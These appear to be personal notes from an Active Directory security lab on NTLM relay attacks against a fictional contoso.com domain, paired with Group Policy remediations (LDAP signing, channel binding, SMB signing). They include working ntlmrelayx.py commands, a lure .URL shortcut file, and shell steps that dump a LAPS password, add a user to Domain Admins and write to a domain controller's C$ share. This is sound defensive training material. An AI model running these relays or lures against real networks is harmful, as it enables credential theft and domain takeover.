
![[Pasted image 20231013161307.png]]

Protection 
- Enforce LDAP signing 
- Enforce LDAPs channel binding 
- Enforce SMB signing
- Enforce HTTPs with Extended

Protection 
- Disable NTLM on web services 
- Use the Protected Users group (for privileged account) 
- Block NTLM on system where it is not required (hard to achieve) 
- Disable NTLM v1

## How to Abuse NTLM authentication protocol

Perform an NTLM relay attack to impersonate Katrina's account against AD DS.

###  Prepare the attack

Start a fake HTTP service with the only objective to perform an NTLM relay attack against AD DS using LDAP.
  
Use of the python script **ntlmrelayx.py** that listen on a fake HTTP service and relay all connections to AD and open an LDAP interactive shell.

```powershell
python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldap://dc01

or 

python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldaps://dc01.contoso.com
```

It starts to listen on connections on port 80. Leave that running.

Create a shortcut file `CLICK.URL` to trick a user into clicking it
    ```
    [{000214A0-0000-0000-C000-000000000046}]
    Prop3=19,2
    [InternetShortcut]
    IDList=
    URL=http://cli01.contoso.com/
    IconIndex=234
    HotKey=0
    IconFile=C:\Windows\System32\SHELL32.DLL
    ```

### Relay an authentication

When we click on the file : 
![[Pasted image 20231021191610.png]]

In your **Windows Terminal (Admin)** window, you should see the following: 

![[Pasted image 20231021191700.png]]
You can see that the message indicates that an interactive shell was starting.

Now we can start a netcat on : 
`ncat 127.0.0.1 11000` 

In the **C:\Program File (x86)\Nmap\ncat.exe** window run `help` to get the list of commands. Then type `get_laps_password SRV01$`. 
Here you go, you have the password of the default local admin of SRV01. 
Let's play a joke on **Mister Blue** and add yourself to the **Domain Admins** group. Run the following: `add_user_to_group red "domain admins"`. 
Here you go, your own account is now a member of the domain admins group: ![DA.png](https://labondemand.blob.core.windows.net/content/lab127288/DA.png)

### Remediation - Enforce LDAP signing

The attack was possible because of multiple factors:

1. The user clicked where she shouldn't have, maybe a bit of user training is a good idea
2. NTLM was enabled for an admin account
3. Signing was not enforce on the LDAP component of the domain controller

For 1, well go train your admins. For 2, we have seen some mitigation already. For 3, let's enforce LDAP signing.

In the **Run** window, type `gpmc.msc` and click **OK**.

Navigate to **Group Policy Management > Forest: contoso.com > Domain > contoso.com > Domain Controllers**. Right click on Default Domain Controller Policy and click Edit.

**Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. 

Double click on **Domain controller: LDAP server signing requirements**. 

Then click **Define this policy setting**, pick **Require signing** from the drop down menu, and click **OK**
    Forcing signing in that case did not affect the connection made over TLS. Enforcing LDAP Signing is not enough. You also need to enforce what is called the Channel Binding Token for LDAPS connections.


### Then enforce LDAPS channel binding token

This time you are going to do things on **DC02**. We will see why a bit later.


In the **Run** window, type `gpmc.msc` and click **OK**.
**Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com** > **Domain Controllers**. Right click on **Default Domain Controller Policy** and click **Edit**.
    
In the **Group Policy Management Editor** window, navigate **Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. Double click on **Domain controller: LDAP server channel binding token requirements**. Pick **Always** from the drop down menu, and click **OK**.
    
    > If you do not see this option, you might be connected to DC01 and not DC02. DC01 is missing security updates in your lab. Hence the option isn't there. That's why we do that on DC02. Note that the GPMC console can be pointing to DC01 that's fine. But the console has to be opened from DC02 in your lab.

If you want to check if that protection worked, you can run the following from **CLI01**: `python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t ldaps://dc02.contoso.com` and try to connect with Katrina again.



### Try again to relay Katrina's connection



`python.exe ntlmrelayx.py --no-smb-server --no-raw-server --no-wcf-server -i -t smb://192.168.1.11 -smb2support --remove-mic`
This time it is an NTLM relay to the SMB server of DC01, not LDAP. So this time if SMB Signing is not enforce on the server side, you'll get an easy access too 😎

 Refresh the **Edge** window (it should still be the address `http://cli01.contoso.com`).
Then go back on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. And have a look at the terminal: ![SMBOWNED.png](https://labondemand.blob.core.windows.net/content/lab127288/SMBOWNED.png)
 `ncat 127.0.0.1 11000`

In the **C:\Program File (x86)\Nmap\ncat.exe** window run `shares`. This display all available share. Let's get into **C$**, run `use c$` then run `mkdir IWASTHERE`. Now list all the files and folders in the share with `ls`. You can see your new folder of the C drive of the DC: !!

![[Pasted image 20231101220246.png]]

How to block this one? Well simple. Like we enforced LDAP signing, **Mister Blue** will have to enable SMB signing.

### Enforce SMB Signing

 You blocked relay attack on LDAP, but not on the SMB service (the file server service). And this time the scope of the risk is bigger. The LDAP service is available only on domain controllers. But the file server service, it might be on pretty much all machines. So, to stop the attack everywhere, let's enforce the SMB signing on all systems.

`gpmc.msc` 
 **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com**. Right click on **Default Domain Policy** and click **Edit**.

In the **Group Policy Management Editor** window, navigate **Default Domain Controller Policy [DC01.contoso.com]** > **Computer Configuration** > **Policies** > **Windows Settings** > **Security Settings** > **Local Policies** > **Security Options**. Double click on **Microsoft network server: Digitally sign communications (always)**. Then click **Define this policy setting**, select **Enabled** and click **OK**.
